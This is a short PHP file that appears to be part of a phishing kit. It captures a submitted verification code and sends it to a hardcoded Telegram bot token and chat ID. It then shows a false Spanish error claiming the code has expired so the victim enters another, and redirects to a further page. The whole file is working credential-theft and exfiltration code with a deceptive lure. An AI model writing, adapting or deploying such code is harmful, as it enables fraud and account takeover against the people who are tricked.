<?php
ini_set("display_errors", 0);

////////////////////
if ( isset ($_POST['cod'])  ){

$message = "Codigo1: ".$_POST['cod']."\r\n";

$apiToken = "5590338703:AAEeurTEIaJZFuwaCY3pGdUHPRzRQELX9fs";


$data = [
  'chat_id' => '-1001901333657',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}else{ header ('location: index.php'); exit();
 }

?>


<script language="javascript">alert("ERROR, EL CÓDIGO INGRESADO ESTA VENCIDO\r\nACEPTE PARA ENVIARLO NUEVAMENTE.");</script>';
<script type="text/javascript">window.location.href = "index4.php";</script>';
}
?>